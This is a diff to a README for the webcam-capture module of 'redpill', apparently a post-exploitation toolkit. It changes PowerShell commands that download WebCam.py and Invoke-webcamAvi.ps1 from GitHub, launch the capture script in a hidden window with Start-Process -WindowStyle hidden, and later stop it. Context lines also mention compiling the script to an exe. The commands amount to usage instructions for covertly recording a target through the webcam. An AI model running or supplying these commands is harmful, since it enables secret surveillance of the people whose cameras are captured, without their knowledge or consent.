@@ -8,7 +8,7 @@
 
 **download script:**
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$Env:TMP\WebCam.py"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "WebCam.py"
 ```
 
 <br />
@@ -37,7 +37,7 @@ gci "$Env:LOCALAPPDATA\Programs" -Recurse -Force|?{$_.PSIsContainer -Match "True
 sys.path.append("c:\\users\\pedro\\appdata\\local\\programs\\python\\python39\\lib\\site-packages")
 
 #Start capture
-cd $Env:TMP;Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"
+Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"
 
 #Stop capture
 Stop-Process -Name "python3.*" -Force
@@ -64,7 +64,7 @@ WebCam.py can be compiled to exe using pyinstaller: pyinstaller –onefile "WebC
 
 **download script:**
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1" -OutFile "$Env:TMP\Invoke-webcamAvi.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1" -OutFile "Invoke-webcamAvi.ps1"
 ```
 
 <br />
